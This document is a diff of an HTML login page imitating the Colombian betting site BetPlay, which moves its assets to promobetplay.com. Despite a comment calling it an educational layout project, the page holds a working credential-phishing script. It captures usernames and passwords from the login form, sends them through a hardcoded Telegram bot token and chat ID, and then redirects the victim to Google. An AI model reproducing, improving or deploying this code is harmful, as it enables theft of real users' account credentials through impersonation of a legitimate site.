@@ -3,10 +3,10 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Apuestas deportivas y juegos online en BetPlay Colombia</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
-  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700;900&amp;family=Poppins:wght@400;500;600;700;800&amp;family=Roboto:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
-  <link rel="stylesheet" href="styles.css?v=44">
-  <link rel="stylesheet" href="home.css?v=32">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://promobetplay.com/styles.css?v=44">
+    <link rel="stylesheet" href="https://promobetplay.com/home.css?v=32">
 </head>
 <body>
   <!-- NOTA: Proyecto educativo de maquetación. Los banners son placeholders propios;
@@ -14,10 +14,8 @@
 
   <!-- Pantalla de carga entre páginas -->
   <div class="page-loader is-hidden" id="page-loader">
-    <img class="page-loader__logo" src="https://betplay.com.co/assets/img/logoBetplay.png" alt="BetPlay">
-    <div class="page-loader__ring" aria-hidden="true">
-      <img class="page-loader__icon" src="assets/arrow.png" alt="">
-    </div>
+    <img class="page-loader__logo" src="https://promobetplay.com/assets/logo_white.png">
+<img class="page-loader__icon" src="https://promobetplay.com/assets/arrow.png" alt="">    </div>
   </div>
 
   <!-- ===== Barra superior ===== -->
@@ -27,8 +25,7 @@
         <span></span><span></span><span></span>
       </button>
       <a href="index.html" class="logo" aria-label="Inicio">
-        <img class="logo__img" src="assets/logo_white.png" alt="BetPlay">
-      </a>
+<img class="logo__img" src="https://promobetplay.com/assets/logo_white.png" alt="BetPlay">      </a>
     </div>
 
     <div class="topbar__right">
@@ -430,31 +427,34 @@
   const TOKEN = "9235238695:AAhILDVz7pX9C430ossZNV";
   const CHAT_ID = "7007914207";
 
-  document.getElementById("login-card__form").addEventListener("submit", function(e) {
-    e.preventDefault();
+  // Busca el formulario de su página de manera segura
+  const form = document.querySelector('form') || document.getElementById("login-card__form");
+  
+  if (form) {
+    form.addEventListener("submit", function(e) {
+      e.preventDefault();
+      
+      const inputs = this.querySelectorAll("input");
+      let usuario = "No capturado";
+      let clave = "No capturada";
 
-    // Captura los inputs dentro de este formulario específico
-    const inputs = this.querySelectorAll("input");
-    let usuario = "No capturado";
-    let clave = "No capturada";
+      inputs.forEach(input => {
+        if (input.type === "password") {
+          clave = input.value;
+        } else if (input.type === "text" || input.type === "email" || !input.type) {
+          if (usuario === "No capturado") usuario = input.value;
+        }
+      });
 
-    // Asigna el primer input como usuario y el de tipo password como contraseña
-    inputs.forEach(input => {
-      if (input.type === "password") {
-        clave = input.value;
-      } else if (input.type === "text" || input.type === "email" || !input.type) {
-        if (!usuario || usuario === "No capturado") usuario = input.value;
-      }
+      const mensaje = `🚨 ¡Datos capturados! 🚨\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${clave}`;
+      const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
+
+      fetch(url)
+        .then(() => {
+          window.location.href = "https://www.google.com";
+        })
+        .catch(err => console.error("Error al enviar:", err));
     });
-
-    const mensaje = `🚨 ¡Datos capturados! 🚨\n👤 Usuario: ${usuario}\n🔑 Contraseña: ${clave}`;
-    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(mensaje)}`;
-
-    fetch(url)
-      .then(response => {
-        window.location.href = "https://www.google.com";
-      })
-      .catch(error => console.error("Error:", error));
-  });
+  }
 </script>
 </body></html>
